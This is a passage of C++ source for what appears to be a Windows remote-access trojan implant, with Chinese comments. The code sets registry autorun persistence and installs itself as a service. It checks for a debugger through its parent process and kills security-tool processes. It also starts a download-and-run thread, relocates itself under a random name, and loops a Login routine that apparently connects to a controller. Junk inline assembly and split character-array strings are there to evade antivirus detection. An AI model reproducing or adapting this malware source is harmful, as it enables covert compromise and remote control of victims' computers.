    long lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, asd, 0, KEY_WRITE, &hKey);
    if (lRet == ERROR_SUCCESS) {
        DWORD dwRet = GetModuleFileNameA(NULL, MyPath, MAX_PATH);
        lRet = RegSetValueExA(hKey, xy, 0, REG_SZ, (BYTE*)MyPath, dwRet);
        Sleep(0);
        __asm nop;
        __asm nop;
        __asm nop;
        __asm nop;
        __asm nop;
        printf("sssssss894sa8d9748asf48a74fs9898g");
        Sleep(0);
        RegCloseKey(hKey);
        if (lRet != ERROR_SUCCESS) {
            Sleep(0);
        }
    }
}

const char* getGUID()//生产随机数函数
{
    CoInitialize(NULL);
    static char buf[64] = { 0 };
    GUID guid;
    if (S_OK == ::CoCreateGuid(&guid)) {
        _snprintf(buf, sizeof(buf)
                  , "%08X"
                  , guid.Data1
                 );
    }
    CoUninitialize();
    return (const char*)buf;
}

#include "tlhelp32.h"
DWORD get_parent_processid(DWORD pid)
{
    DWORD ParentProcessID = -1;

    PROCESSENTRY32 pe;
    _asm inc eax;
    _asm dec ebx;
    _asm dec eax;
    _asm inc ebx;
    HANDLE hkz;

    HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));

    FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");

    if (Address == NULL) {
        OutputDebugString(_T("GetProc error"));
        _asm inc eax;
        _asm dec ebx;
        _asm dec eax;
        _asm inc ebx;
        return-1;
    }

    _asm {
        push 0
        push 2
        _asm inc eax;
        _asm dec ebx;
        _asm dec eax;
        _asm inc ebx;
        call Address
        mov hkz, eax
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hkz, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                _asm inc eax;
                _asm dec ebx;
                _asm dec eax;
                _asm inc ebx;
                ParentProcessID = pe.th32ParentProcessID;

                break;
            }

        } while (Process32Next(hkz, &pe));
    }

    return ParentProcessID;
}

DWORD get_explorer_processid()
{
    _asm inc eax;
    _asm dec ebx;
    _asm dec eax;
    _asm inc ebx;
    DWORD explorer_id = -1;

    PROCESSENTRY32 pe;

    HANDLE hkz;

    HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));

    if (hModule == NULL) {
        _asm inc eax;
        _asm dec ebx;
        _asm dec eax;
        _asm inc ebx;

        OutputDebugString(_T("Loaddll error"));

        return-1;
    }

    FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
    _asm inc eax;
    _asm dec ebx;
    _asm dec eax;
    _asm inc ebx;
    if (Address == NULL) {
        OutputDebugString(_T("GetProc error"));

        return-1;
    }

    _asm {
        push 0

        push 2

        call Address

        mov hkz, eax
        _asm inc eax;
        _asm dec ebx;
        _asm dec eax;
        _asm inc ebx;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hkz, &pe)) {
        do {
            _asm inc eax;
            _asm dec ebx;
            _asm dec eax;
            _asm inc ebx;
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                explorer_id = pe.th32ProcessID;

                break;
            }

        } while (Process32Next(hkz, &pe));
    }
    _asm inc eax;
    _asm dec ebx;
    _asm dec eax;
    _asm inc ebx;
    return explorer_id;
}

extern "C" _declspec (dllexport) void fuckyou()
{
    OutputDebugString("进入加载WinMain");

    // TODO: Place code here.
    //////////////////////////////////////////////////////////////////////////
    // 让启动程序时的小漏斗马上消失
    GetInputState();
    PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
    MSG	msg;
    GetMessage(&msg, NULL, NULL, NULL);

    if (!dll_info.Dele_fs) {
        OutputDebugString("Dele_fs");
        DWORD explorer_id = get_explorer_processid();
        DWORD parent_id = get_parent_processid(GetCurrentProcessId());
        if (!explorer_id == parent_id) { //判断父进程id是否和explorer进程id相同
            ExitProcess(0);
            return;
        }
    }

    OSVERSIONINFO OSversion;
    OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&OSversion);

    if (dll_info.szDownRun != NULL) {
        MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager1,
                       (LPVOID)dll_info.szDownRun, 0, NULL, true);
    }
    if (dll_info.Zjz) { //检查是否K终结者
        KProcess(); //K终结者进程
    }

    if (dll_info.Dele_zc) { //如果不是绿色安装
        OSVERSIONINFO OSversion;
        OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((OSVERSIONINFO*)&OSversion); // 注意转换类型
        GetNtVersionNumbers(OSversion.dwMajorVersion, OSversion.dwMinorVersion, OSversion.dwBuildNumber);
        if (OSversion.dwMajorVersion == 10 && OSversion.dwMinorVersion == 0) {
            //	OutputDebugString("10");
            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)runwin10, NULL, NULL, NULL);
            HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            while (1) {
                Sleep(1000 * 1000);
            }
        }
        if (dll_info.Dele_zc == 2) {
            if (service_is_exist()) {
                SERVICE_TABLE_ENTRY serviceTable[] = {
                    {dll_info.ServiceName,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
                    {NULL,NULL}
                };
                Sleep(500);
                StartServiceCtrlDispatcher(serviceTable);   //服务运行文件
                Sleep(1000);
                StartServiceCtrlDispatcher(serviceTable);   //服务运行
            } else {
                char szPath[MAX_PATH];          //保存自身文件名的字符串
                char SystemPath[MAX_PATH];
                ExpandEnvironmentStrings(dll_info.ReleasePath, SystemPath, MAX_PATH);
                //	MyCreatDirector(SystemPath);   //创建文件夹
                char FileName[80];
                char cpXPZ[] = { '%','s','\0' };
                wsprintf(FileName, cpXPZ, dll_info.ReleaseName);
                if (SystemPath[strlen(SystemPath) - 1] == '\\') //去掉最后的'\\'
                    SystemPath[strlen(SystemPath) - 1] = 0;
                strcat(SystemPath, "\\");
                strcat(SystemPath, FileName);

                char* toPath = SystemPath;        //要复制到的路径字符串
                GetModuleFileNameA(NULL, (LPCH)szPath, 225);     //获取自身路径的函数
                CopyFile(szPath, toPath, false);       //复制函数，从szPath复制到toPath，强行覆盖原有文件
                RunService(dll_info.ServiceName, dll_info.ServicePlay, dll_info.ServiceDesc);
                SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
                MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信息
                Sleep(500);
            }

            MainThread();
            ExitProcess(0);

        }
        if (dll_info.Dele_zc == 1) {
            SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
            MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信
            //定义
            char szFileName[MAX_PATH] = { 0 };
            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)runwin100, NULL, NULL, NULL);

            while (1) {
                HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
                while (1) {
                    Sleep(1000 * 1000);
                }
            }
        }
    } else {
        char Time[64];

        char LcDdy06[] = { '%','s','\0' };
        char lpBuffer[1024] = { NULL };
        sprintf(dll_info.ServiceName, LcDdy06, dll_info.ServiceName);  //赋值服务名称
        //读分组信息
        char UtKoF15[] = { 'C','o','n','n','e','c','t','G','r','o','u','p','\0' };
        ReadRegExg(dll_info.ServiceName, UtKoF15, lpBuffer, sizeof(lpBuffer));
        if (lstrlen(lpBuffer) == 0) { //
            SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
            MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信
        }
        wsprintf(Time, "%s", getGUID());
        ///自删除
        char	strSelf[MAX_PATH];
        memset(strSelf, 0, sizeof(strSelf));
        GetModuleFileName(NULL, strSelf, sizeof(strSelf));
        char Windows[256];
        SHGetSpecialFolderPath(NULL, Windows, 43, FALSE);
        lstrcat(Windows, "\\");
        char* lpTime = Time;
        lstrcat(Windows, lpTime);
        lstrcat(Windows, ".exe");
        MoveFile(strSelf, Windows);
        Sleep(50);
        HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        while (1) {
            Sleep(1000 * 1000);
        }
    }
}

#ifndef _DLL
int main()
{
#else
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
#endif
    // 让启动程序时的小漏斗马上消失
    GetInputState();
    PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
    MSG	msg;
    GetMessage(&msg, NULL, NULL, NULL);

    if (dll_info.Dele_fs) {
        DWORD explorer_id = get_explorer_processid();
        DWORD parent_id = get_parent_processid(GetCurrentProcessId());
        if (!explorer_id == parent_id) { //判断父进程id是否和explorer进程id相同
            ExitProcess(0);
            return -1;
        }
    }

    OSVERSIONINFO OSversion;
    OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&OSversion);

    if (dll_info.szDownRun != NULL) {
        MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager1,
                       (LPVOID)dll_info.szDownRun, 0, NULL, true);
    }
    if (dll_info.Zjz) { //检查是否K终结者
        KProcess(); //K终结者进程
    }

    if (dll_info.Dele_zc) { //如果不是绿色安装
        OSVERSIONINFO OSversion;
        OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((OSVERSIONINFO*)&OSversion); // 注意转换类型
        GetNtVersionNumbers(OSversion.dwMajorVersion, OSversion.dwMinorVersion, OSversion.dwBuildNumber);
        if (OSversion.dwMajorVersion == 10 && OSversion.dwMinorVersion == 0) {
            //	OutputDebugString("10");
            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)runwin10, NULL, NULL, NULL);
            HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            while (1) {
                Sleep(1000 * 1000);
            }
        }
        if (dll_info.Dele_zc == 2) {
            if (service_is_exist()) {
                SERVICE_TABLE_ENTRY serviceTable[] = {
                    {dll_info.ServiceName,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
                    {NULL,NULL}
                };
                Sleep(500);
                StartServiceCtrlDispatcher(serviceTable);   //服务运行文件
                Sleep(1000);
                StartServiceCtrlDispatcher(serviceTable);   //服务运行
            } else {
                char szPath[MAX_PATH];          //保存自身文件名的字符串
                char SystemPath[MAX_PATH];
                ExpandEnvironmentStrings(dll_info.ReleasePath, SystemPath, MAX_PATH);
                char FileName[80];
                char cpXPZ[] = { '%','s','\0' };
                wsprintf(FileName, cpXPZ, dll_info.ReleaseName);
                if (SystemPath[strlen(SystemPath) - 1] == '\\') //去掉最后的'\\'
                    SystemPath[strlen(SystemPath) - 1] = 0;
                strcat(SystemPath, "\\");
                strcat(SystemPath, FileName);
                char* toPath = SystemPath;        //要复制到的路径字符串
                GetModuleFileNameA(NULL, (LPCH)szPath, 225);     //获取自身路径的函数
                CopyFile(szPath, toPath, false);       //复制函数，从szPath复制到toPath，强行覆盖原有文件
                RunService(dll_info.ServiceName, dll_info.ServicePlay, dll_info.ServiceDesc);
                SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
                MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信息
                Sleep(500);
            }

            MainThread();
            ExitProcess(0);
        }
        if (dll_info.Dele_zc == 1) {
            SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
            MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信

            char szFileName[MAX_PATH] = { 0 };

            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)runwin100, NULL, NULL, NULL);

            while (1) {
                HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
                while (1) {
                    Sleep(1000 * 1000);
                }
            }
        }
    } else {
        char Time[64];

        char LcDdy06[] = { '%','s','\0' };
        char lpBuffer[1024] = { NULL };
        sprintf(dll_info.ServiceName, LcDdy06, dll_info.ServiceName);  //赋值服务名称
        //读分组信息
        char UtKoF15[] = { 'C','o','n','n','e','c','t','G','r','o','u','p','\0' };
        ReadRegExg(dll_info.ServiceName, UtKoF15, lpBuffer, sizeof(lpBuffer));
        if (lstrlen(lpBuffer) == 0) { //
            SetGroup(dll_info.ServiceName, dll_info.Group);//写入分组信息
            MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信
        }
        wsprintf(Time, "%s", getGUID());

        if (dll_info.Dele_te) {
            char	strSelf[MAX_PATH];
            memset(strSelf, 0, sizeof(strSelf));
            GetModuleFileName(NULL, strSelf, sizeof(strSelf));
            char Windows[256];
            SHGetSpecialFolderPath(NULL, Windows, 43, FALSE);
            lstrcat(Windows, "\\");
            char* lpTime = Time;
            lstrcat(Windows, lpTime);
            lstrcat(Windows, ".exe");
            MoveFile(strSelf, Windows);
        } else {
            char	strSelf[MAX_PATH];
            memset(strSelf, 0, sizeof(strSelf));
            GetModuleFileName(NULL, strSelf, sizeof(strSelf));
        }
        Sleep(50);

        HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        while (1) {
            Sleep(1000 * 1000);
        }
    }

    return 0;
}
